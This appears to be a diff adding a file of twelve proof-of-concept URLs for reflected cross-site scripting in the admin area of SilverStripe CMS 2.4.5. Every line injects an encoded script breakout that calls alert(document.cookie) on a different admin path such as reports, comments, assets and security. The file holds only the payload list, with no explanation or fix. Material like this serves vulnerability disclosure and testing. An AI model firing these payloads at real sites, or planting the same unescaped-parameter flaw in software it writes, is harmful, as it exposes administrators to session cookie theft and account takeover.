@@ -1,0 +1,14 @@
+http://www.example.com/SilverStripe-v2.4.5/admin/reports/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/comments/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/4?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/2?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/root?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/3?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/assets/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/1?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/show/5?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/SilverStripe-v2.4.5/admin/security/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
